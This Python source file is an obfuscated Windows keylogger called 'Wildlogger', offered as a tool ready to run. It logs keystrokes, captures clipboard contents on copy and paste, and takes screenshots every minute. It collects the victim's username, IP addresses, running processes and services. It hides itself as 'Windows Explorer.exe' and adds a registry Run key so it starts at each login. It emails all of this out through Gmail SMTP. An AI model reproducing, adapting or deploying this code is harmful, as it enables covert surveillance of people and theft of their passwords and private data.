from pynput import keyboard 
import threading 
import datetime 
import pyautogui 
import os ,tempfile 
import smtplib 
from email .mime .multipart import MIMEMultipart 
from email .mime .text import MIMEText 
from email .mime .image import MIMEImage 
import clipboard 
import requests 
import socket 
import wmi 
import shutil 
import sys 
import subprocess 
class Wildlogger :
    def __init__ (OOO0O00OO0OO00OO0 ,OOO0O0O00OO00OO0O ,OOO0OOO0O00OO00OO ,O00OO00O0OOO00O00 ,OOOO0OO0O00OO0000 ,O00OO0OOO0O0O0OO0 ):
        OOO0O00OO0OO00OO0 .log =""
        OOO0O00OO0OO00OO0 .text_interval =OOO0O0O00OO00OO0O 
        OOO0O00OO0OO00OO0 .screenshot_interval =OOO0OOO0O00OO00OO 
        OOO0O00OO0OO00OO0 .from_email =O00OO00O0OOO00O00 
        OOO0O00OO0OO00OO0 .password =OOOO0OO0O00OO0000 
        OOO0O00OO0OO00OO0 .to_email =O00OO0OOO0O0O0OO0 
        OOO0O00OO0OO00OO0 .pictures =[]
        OOO0O00OO0OO00OO0 .mail =MIMEMultipart ()
        OOO0O00OO0OO00OO0 .c =wmi .WMI ()
        OOO0O00OO0OO00OO0 .status =1 
        OOO0O00OO0OO00OO0 .user =""
        OOO0O00OO0OO00OO0 .current_key_list =set ()
        OOO0O00OO0OO00OO0 .COMBINATIONS =[{keyboard .Key .ctrl_l ,keyboard .KeyCode (char ='c')},{keyboard .Key .ctrl_l ,keyboard .KeyCode (char ='C')},{keyboard .Key .ctrl_r ,keyboard .KeyCode (char ='c')},{keyboard .Key .ctrl_r ,keyboard .KeyCode (char ='C')},{keyboard .Key .ctrl_l ,keyboard .KeyCode (char ='v')},{keyboard .Key .ctrl_l ,keyboard .KeyCode (char ='V')},{keyboard .Key .ctrl_r ,keyboard .KeyCode (char ='v')},{keyboard .Key .ctrl_r ,keyboard .KeyCode (char ='V')}]
    def persistent (O0O00OOOOO0O00OOO ):
        OOOO00OOOOO000O00 =os .environ ["appdata"]+"\\Windows Explorer.exe"
        if not os .path .exists (OOOO00OOOOO000O00 ):
            shutil .copyfile (sys .executable ,OOOO00OOOOO000O00 )
            subprocess .call ('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+OOOO00OOOOO000O00 +'"',shell =True )
    def connectionInfo (O00OO0OO0OOOOOOO0 ):
        O00OO0OO0OOOOOOO0 .user =os .path .expanduser ('~').split ('\\')[2 ]
        OO000O0O0OOOOOO0O =datetime .datetime .now ().strftime ("%d-%m-%Y %H")+":**"
        O0000OO0OO0O00OO0 =""
        try :
            O0000OO0OO0O00OO0 =requests .get ('https://api.ipify.org/').text 
        except :
            print ("[-] Unable to connect to https://api.ipify.org !")
        OO00OO0000OO00OOO =socket .gethostbyname (socket .gethostname ())
        return """
          <h3>[+] Datetime:<span style="color:red;">"""+OO000O0O0OOOOOO0O +"""</span></h3>
          <h3>[+] Username:<span style="color:red;">"""+O00OO0OO0OOOOOOO0 .user +"""</span></h3>
          <h3>[+] Public IP:<span style="color:red;">"""+O0000OO0OO0O00OO0 +"""</span></h3>
          <h3>[+] Private IP:<span style="color:red;">"""+OO00OO0000OO00OOO +"""</span></h3>
        """
    def runningProcesses (OOOOO00OO000OO0OO ):
        try :
            OO0O0000O000000O0 =""
            for O0O0OO00OO0O0OO00 in OOOOO00OO000OO0OO .c .Win32_Process ():
                if O0O0OO00OO0O0OO00 .Name not in OO0O0000O000000O0 :
                    OO0O0000O000000O0 =OO0O0000O000000O0 +"<h3>"+O0O0OO00OO0O0OO00 .Name +"<h3>"
            if OO0O0000O000000O0 is not None :
                return OO0O0000O000000O0 
        except Exception :
            pass 
    def nonRunningServices (O00OO0000OO00OO00 ):
        O00O0O0O0O000O0OO =""
        try :
            O00O00OOO0OO0OO0O =O00OO0000OO00OO00 .c .Win32_Service (StartMode ="Auto",State ="Stopped")
            if O00O00OOO0OO0OO0O :
                for OOO0O00000OO0OO0O in O00O00OOO0OO0OO0O :
                    O00O0O0O0O000O0OO =O00O0O0O0O000O0OO +"<h3>"+OOO0O00000OO0OO0O .Caption +"<h3>"
            else :
                O00O0O0O0O000O0OO ="<h3>No auto services stopped<h3>"
            if O00O0O0O0O000O0OO is not None :
                return O00O0O0O0O000O0OO 
        except Exception :
            pass 
    def AboutComputerSystem (O000O00000OO0O00O ):
        try :
            O00OO000OO00O0OO0 =str (O000O00000OO0O00O .c .Win32_ComputerSystem ()[0 ])
            O00OO000OO00O0OO0 =O00OO000OO00O0OO0 .replace (";",";<br>").replace ("instance of Win32_ComputerSystem","<b>INSTANCE OF WIN32_COMPUTERSYSTEM</b><br>").replace ("}","").replace ("{","")
            if O00OO000OO00O0OO0 is not None :
                return O00OO000OO00O0OO0 
        except Exception :
            pass 
    def victimInfo (OO0O0OOO00OO0O00O ):
        return """
                <!DOCTYPE html>
                <html lang="en">
                <head>
                  <meta charset="UTF-8">
                  <title>Document</title>
                </head>
                <body>
                  <h2 align="center">Keylogger Started!</h2>
                  <hr>
                  <h2 align="center">[+] Connection İnformation</h2>
                   <b>
                   """+str (OO0O0OOO00OO0O00O .connectionInfo ())+"""
                   <b/>
                   <hr>
                  <h2 align="center">[+] System İnformation</h2>
                  <b>
                    """+str (OO0O0OOO00OO0O00O .AboutComputerSystem ())+"""
                   <b/>
                   <hr>
                  <h2 align="center">[+] Running Processes List</h2>
                  """+str (OO0O0OOO00OO0O00O .runningProcesses ())+"""
                   <hr>       
                 <h2 align="center">[+] Non Working Automatic Services List</h2>
                """+str (OO0O0OOO00OO0O00O .nonRunningServices ())+"""
                   <hr>
                </body>
                </html>
                """
    def takeScreenshot (O00O0O0OO0O00000O ):
        O00OOO0000O0O00OO ={}
        OO0O0O0O000000O00 =datetime .datetime .now ().strftime ("%d-%m-%Y %H-%M-%S")
        OO0O0O0O000000O00 =OO0O0O0O000000O00 .replace (" ","-").replace (".","-").replace (":","-")
        OOOO0O000O00OO0O0 =OO0O0O0O000000O00 +".jpg"
        O000OOO0O0O00O000 =tempfile .gettempdir ()
        O000000O00O0O00O0 =O000OOO0O0O00O000 +"\\"+OOOO0O000O00OO0O0 
        O0O00OOOO0O0OO000 =pyautogui .screenshot ()
        O0O00OOOO0O0OO000 .save (O000000O00O0O00O0 )
        O00OOO0000O0O00OO ["filename"]=OOOO0O000O00OO0O0 
        O00OOO0000O0O00OO ["path"]=O000000O00O0O00O0 
        O00O0O0OO0O00000O .pictures .append (O00OOO0000O0O00OO )
        if len (O00O0O0OO0O00000O .pictures )==10 :
            O00O0O0OO0O00000O .report (2 )
        OOOOOOO000O0OOO0O =threading .Timer (O00O0O0OO0O00000O .screenshot_interval ,O00O0O0OO0O00000O .takeScreenshot )
        OOOOOOO000O0OOO0O .start ()
    def prepareScreenshots (OOO000OOOOOOOOO0O ):
        for O0OOOOOO0000O0000 in OOO000OOOOOOOOO0O .pictures :
            O000OO0OO00OOO0O0 =open (O0OOOOOO0000O0000 ["path"],"rb").read ()
            O0000O000OOOO00OO =MIMEImage (O000OO0OO00OOO0O0 ,name =O0OOOOOO0000O0000 ["filename"])
            OOO000OOOOOOOOO0O .deleteScreenshot (O0OOOOOO0000O0000 ["path"])
            OOO000OOOOOOOOO0O .mail .attach (O0000O000OOOO00OO )
    def append_to_log (O000OOOOO0O000000 ,O00O000O000O0O000 ):
        if "Clipboard"in O00O000O000O0O000 :
            O00O000O000O0O000 =O00O000O000O0O000 .replace ('***\nc','***\n')
            O00O000O000O0O000 =O00O000O000O0O000 .replace ('***\nv','***\n')
        O000OOOOO0O000000 .log =O000OOOOO0O000000 .log +O00O000O000O0O000 
    def delete_to_log (OO00OO000OO00O00O ):
        OO00OO000OO00O00O .log =OO00OO000OO00O00O .log [:-1 ]
    def deleteScreenshot (O0OO00O0OO0OO0000 ,OO0O0OO00O0OOOOOO ):
        os .remove (OO0O0OO00O0OOOOOO )
    def on_press (OOOO000OO000O00OO ,OOO0000O00OO00000 ):
        O00O0O0000OO000O0 =""
        if any ([OOO0000O00OO00000 in O00O00O0OO00O0O00 for O00O00O0OO00O0O00 in OOOO000OO000O00OO .COMBINATIONS ]):
            OOOO000OO000O00OO .current_key_list .add (OOO0000O00OO00000 )
            if any (all (O0000O00OOO0O000O in OOOO000OO000O00OO .current_key_list for O0000O00OOO0O000O in O0000000000O00OOO )for O0000000000O00OOO in OOOO000OO000O00OO .COMBINATIONS ):
                O00O0O0000OO000O0 +="\n*** Start Clipboard ***\n"
                O00O0O0000OO000O0 +=clipboard .paste ()
                O00O0O0000OO000O0 +="\n*** End Clipboard ***\n"
        if OOO0000O00OO00000 ==keyboard .Key .enter :
            O00O0O0000OO000O0 +="\n"
        elif OOO0000O00OO00000 ==keyboard .Key .space :
            O00O0O0000OO000O0 +=" "
        elif OOO0000O00OO00000 ==keyboard .Key .backspace :
            OOOO000OO000O00OO .delete_to_log ()
        else :
            try :
                O00O0O0000OO000O0 +=OOO0000O00OO00000 .char 
            except :
                pass 
        OOOO000OO000O00OO .append_to_log (O00O0O0000OO000O0 )
    def on_release (OOOO000O0OOOOO0O0 ,O0O000O0O000OOOO0 ):
        if any ([O0O000O0O000OOOO0 in O0OO0OOO00000O0O0 for O0OO0OOO00000O0O0 in OOOO000O0OOOOO0O0 .COMBINATIONS ]):
            OOOO000O0OOOOO0O0 .current_key_list .remove (O0O000O0O000OOOO0 )
    def report (OO00O00OO0O00O000 ,condition =1 ):
        if condition ==1 :
            OO00O00OO0O00O000 .sendMail (OO00O00OO0O00O000 .from_email ,OO00O00OO0O00O000 .password ,OO00O00OO0O00O000 .to_email ,"\n\n"+OO00O00OO0O00O000 .log )
            OO00O00OO0O00O000 .log =""
            O0OOOO00O0O000000 =threading .Timer (OO00O00OO0O00O000 .text_interval ,OO00O00OO0O00O000 .report )
            O0OOOO00O0O000000 .start ()
        elif condition ==2 :
            OO00O00OO0O00O000 .prepareScreenshots ()
            OO00O00OO0O00O000 .sendMail (OO00O00OO0O00O000 .from_email ,OO00O00OO0O00O000 .password ,OO00O00OO0O00O000 .to_email )
            OO00O00OO0O00O000 .pictures =[]
        elif condition ==3 :
            OO00O00OO0O00O000 .sendMail (OO00O00OO0O00O000 .from_email ,OO00O00OO0O00O000 .password ,OO00O00OO0O00O000 .to_email )
            O0OOOO00O0O000000 =threading .Timer (OO00O00OO0O00O000 .text_interval ,OO00O00OO0O00O000 .report )
            O0OOOO00O0O000000 .start ()
        OO00O00OO0O00O000 .mail =MIMEMultipart ()
    def sendMail (OOO0000000O0O0OO0 ,O0OOOO000OO0OOOOO ,O0O0000OOOO0OOO00 ,OO00O0O0000O0O0O0 ,log =""):
        try :
            if log !="":
                OOO0000000O0O0OO0 .mail .attach (MIMEText (log ,"plain"))
            if OOO0000000O0O0OO0 .status :
                OOO0000000O0O0OO0 .status =0 
                OOO0000000O0O0OO0 .mail .attach (MIMEText (OOO0000000O0O0OO0 .victimInfo (),"html"))
            OOO0000000O0O0OO0 .mail ["Subject"]="Keylogger Log Records  From "+OOO0000000O0O0OO0 .user +" ~ "+datetime .datetime .now ().strftime ("%d-%m-%Y %H")+":**"
            OOO0000000O0O0OO0 .mail ["From"]=O0OOOO000OO0OOOOO 
            OOOOO0000OOOOOO0O =smtplib .SMTP ("smtp.gmail.com",587 )
            OOOOO0000OOOOOO0O .ehlo ()
            OOOOO0000OOOOOO0O .starttls ()
            OOOOO0000OOOOOO0O .ehlo ()
            OOOOO0000OOOOOO0O .login (O0OOOO000OO0OOOOO ,O0O0000OOOO0OOO00 )
            OOOOO0000OOOOOO0O .sendmail (O0OOOO000OO0OOOOO ,OO00O0O0000O0O0O0 ,OOO0000000O0O0OO0 .mail .as_string ())
            OOOOO0000OOOOOO0O .quit ()
        except smtplib .SMTPException :
            print ("[-] Sending Mail Error!")
        except smtplib .SMTPServerDisconnected :
            print ("[-] SMTP Server Disconnected!")
        except smtplib .SMTPConnectError :
            print ("[-] SMTP Connect Error")
        except socket .gaierror :
            print ("[-] Socket Gaierror")
    def start (OOO0OOO000OO0O00O ):
        O00O000O00OOOOO0O =keyboard .Listener (on_press =OOO0OOO000OO0O00O .on_press ,on_release =OOO0OOO000OO0O00O .on_release )
        with O00O000O00OOOOO0O :
            OOO0OOO000OO0O00O .takeScreenshot ()
            OOO0OOO000OO0O00O .report (3 )
            O00O000O00OOOOO0O .join ()
try :
    interval_for_log =300 
    interval_for_Screenshot =60 
    Wildlogger =Wildlogger (interval_for_log ,interval_for_Screenshot ,"your_email@gmail.com","your_password","e-mail address for report")
    Wildlogger .start ()
except :
    pass 